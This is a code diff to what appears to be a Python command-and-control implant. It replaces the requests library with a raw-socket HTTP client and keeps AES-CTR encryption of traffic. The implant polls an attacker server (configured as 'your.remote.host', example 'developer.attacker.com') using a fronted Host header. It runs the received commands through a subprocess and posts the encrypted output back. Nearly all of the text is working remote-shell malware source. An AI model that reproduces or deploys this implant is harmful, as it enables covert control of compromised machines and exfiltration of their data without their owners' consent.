@@ -6,9 +6,8 @@ import re
 import shlex
 from time import sleep
 from subprocess import PIPE, Popen
-import requests
 from random import randint
-
+import socket
 """
 PyAES Embedded Library -- Allows for cross platform compatibility with no outside dependencies.
 Program logic around line 1068 ... 
@@ -1177,14 +1176,11 @@ Main Program Logic Starts here
 
 #  Configuration
 debug = False
-front_url = 'your.remote.host'  # your c&c server: example: developer.attacker.com
-url = 'http://localhost:8880'  # example: http://upwork.com:8880 - (include port of listener if not port 80 (http)
-host_header = str('Host: %s' % front_url)
+front_host = 'your.remote.host'  # your c&c server: example: developer.attacker.com
+url = 'localhost:8880'  # example: http://upwork.com:8880 - (include port of listener if not port 80 (http)
+host_header = str('Host: %s' % front_host)
 key = b"This_key_for_demo_purposes_only!"  # AES Encryption key - keep private, must be in byte form.
-
-
 # runtime variables
-
 connected = False
 
 
@@ -1194,14 +1190,9 @@ def enc(data):
     :param data: plaintext
     :return: ciphertext (base64 wrapper)
     """
-    # A 256 bit (32 byte) key
-    plaintext = "Text may be any length you wish, no padding is required"
-    # key must be bytes, so we convert it
     aes = AESModeOfOperationCTR(key)
     ciphertext = aes.encrypt(data)
     encoded = base64.b64encode(ciphertext).decode('utf-8')
-
-    # show the encrypted data
     return encoded
 
 
@@ -1211,11 +1202,7 @@ def denc(data):
     :param data: ciphertext (base64 wrapper)
     :return: plaintext
     """
-    # DECRYPTION
-    # CRT mode decryption requires a new instance be created
     aes = AESModeOfOperationCTR(key)
-    decoded = None
-    # decrypted data is always binary, need to decode to plaintext
     try:
         decoded = base64.b64decode(data)
     except Exception as err:
@@ -1228,7 +1215,6 @@ def denc(data):
                 print(err)
             decoded = None
 
-
     if decoded:
         try:
             decrypted = aes.decrypt(decoded)
@@ -1239,51 +1225,71 @@ def denc(data):
             return decrypted
 
 
-def req(url, payload=None, method='POST', timeout=600):
+def req(url, host, method='POST', page='/', payload=None):
     """
-    HTTP Request Function
-    :param url: query this DNS
-    :param payload: if method is post, send this payload
-    :param method: HTTP method, supported: GET, POST
-    :param timeout: Timeout of request
-    :return: upon failure
+    Socket powered HTTP client - replacement for requests
+    :param url: socket connect to url:port
+    :param host: send this host header
+    :param method: HTTP Method - GET or POST
+    :param page: retrieve this url (/index.html)
+    :param payload: send this payload (for POST)
+    :return: html body text
     """
-    headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0',
-               'Accept': 'text/css,*/*;q=0.1',
-               'Accept-Language': 'en-US,en;q=0.5',
-               'Connection': 'keep-alive',
-               'Host': front_url}
 
-    if method == 'POST':
-        try:
-            html = requests.post(url=url, headers=headers, data=payload, timeout=timeout)
-        except requests.exceptions.ReadTimeout as reqerr:
-            if debug:
-                print(str(reqerr) + ' : ' + payload)
+    def parse_resp(data):
+        """
+        Parses incoming HTML
+        :param data: http data
+        :return: body
+        """
+        clrf = '\r\n\r\n'
+        rx_to_first = r'^.*?{}'.format(re.escape(clrf))
+        return str(re.sub(rx_to_first, '', data, flags=re.DOTALL).strip())
 
-        except Exception as err:
-            if debug:
-                print('Post Error: ' + str(err))
-        else:
-            html = html.text
-            if html is not None:
-                return html
-            else:
-                pass
+    def post(url, host, payload):
+        _url = url.split(':')
+        url = _url[0]
+        port = int(_url[1])
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            content_len = len(payload)
+            http_req = "POST /write_bin.sh HTTP/1.0\r\nHost: %s\r\nAccept: text/html\r\n" \
+                       "Content-Length: %s\r\n\r\n%s" % (host,
+                                                         content_len, payload)
+            http_req += payload
+            s.connect((url, port))
+            s.sendall(http_req.encode())
 
-    elif method == 'GET':
-        try:
-            html = requests.get(url=url, headers=headers, data=payload, timeout=timeout)
-        except Exception as err:
-            if debug:
-                print('Get Error: ' + str(err))
+            data = b''
+            while True:
+                buf = s.recv(1024)
+                if not buf:
+                    break
+                data += buf
 
-        else:
-            html = html.text
-            return html
-    else:
-        if debug:
-            return 'Unsupported method!'
+            return parse_resp(data.decode())
+
+    def get(url, host, page):
+        _url = url.split(':')
+        url = _url[0]
+        port = int(_url[1])
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            get_str = "GET %s HTTP/1.0\r\nHost: %s\r\nAccept: text/html\r\n\r\n" % (page, host)
+            s.connect((url, port))
+            s.sendall(get_str.encode())
+            data = b''
+            while True:
+                buf = s.recv(1024)
+                if not buf:
+                    break
+                data += buf
+            return parse_resp(data.decode())
+
+    if method == 'GET':
+        res = get(url, host, page)
+        return res
+    elif method == 'POST':
+        res = post(url, host, payload)
+        return res
 
 
 class Result:
@@ -1313,7 +1319,7 @@ def execmd(command):
 
     result.exit_code = p.returncode
     result.stdout = stdout
-    result.stderr = stdout
+    result.stderr = stderr
     result.command = command
 
     if p.returncode != 0:
@@ -1332,9 +1338,8 @@ def shell():
     :return: --
     """
     while True:
-        url_ = url
         try:
-            html = req(url=url_, payload=None, timeout=600, method='GET')
+            html = req(url=url, host=front_host, method='GET', page='/', payload=None)
         except Exception as err:
             if debug:
                 print('Connect Error: ' + str(err))
@@ -1364,15 +1369,12 @@ def shell():
                 if debug:
                     print('cmd: ' + cmd)
                 if cmd is None:
-                    ret = 'Error, try again ... '
-
+                    pass
                 if cmd == '__quit__':
-                    #  req(url, payload='Quitting!', method='POST', timeout=5)
                     if debug:
                         print('Received __quit__ , exiting ...')
                     exit(1)
                 else:
-                    ret = None
                     try:
                         ret = execmd(cmd + "\n")
                     except Exception as err:
@@ -1384,23 +1386,21 @@ def shell():
 
                         ret = str(ret, 'utf-8')
 
-                        retlen = (len(ret))
-                        if retlen == 0:
+                        ret_len = (len(ret))
+                        if ret_len == 0:
                             if debug:
                                 print('0 Length Response')
 
                         else:
                             if ret is not None:
-                                while retlen % 16 != 0:
+                                while ret_len % 16 != 0:
                                     ret += ' '
-                                    retlen = (len(ret))
+                                    ret_len = (len(ret))
                                 ret = enc(ret)
-                                content = ("<html><body><h1>%s</h1></body></html>" % ret).encode()
-                                # payload = str(ret)
                                 if debug:
-                                    print('Post reply')
-                                req(url, payload=ret, method='POST', timeout=10)
-                                # sleep(1)
+                                    print('Post reply: %s' % ret)
+                                # Send output of command back to HTTP listener
+                                req(url=url, host=front_host, method='POST', page='', payload=ret)
                                 return
 
 
@@ -1412,6 +1412,8 @@ def main():
     while True:
         try:
             shell()
+        except KeyboardInterrupt:
+            exit(0)
         except Exception as err:
             if debug:
                 print(err)
